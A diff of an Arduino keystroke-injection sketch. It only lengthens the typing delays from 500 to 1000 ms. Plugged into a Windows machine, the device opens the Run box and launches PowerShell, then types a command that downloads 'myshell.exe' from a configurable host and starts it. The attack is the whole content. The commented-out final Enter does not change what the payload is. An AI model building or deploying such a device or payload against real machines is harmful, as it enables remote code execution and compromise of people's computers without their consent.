@@ -26,22 +26,22 @@ void loop()
   
   if ((buttonState != previousButtonState) && (buttonState == HIGH))
   {
-    delay(500);
+    delay(1000);
 
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press('r');
     Keyboard.releaseAll();
   
-    delay(500);
+    delay(1000);
     Keyboard.print("powershell");
     typeKey(KEY_RETURN);
   
-    delay(500);
+    delay(1000);
   
     Keyboard.print("cd ~/");
     typeKey(KEY_RETURN);
     
-    delay(500);
+    delay(1000);
     Keyboard.print("(new-object System.Net.WebClient).DownloadFile('http://" + direccion + "/myshell.exe', 'myshell.exe'); Start-Process \"myshell.exe\" ");
     //typeKey(KEY_RETURN);
   }
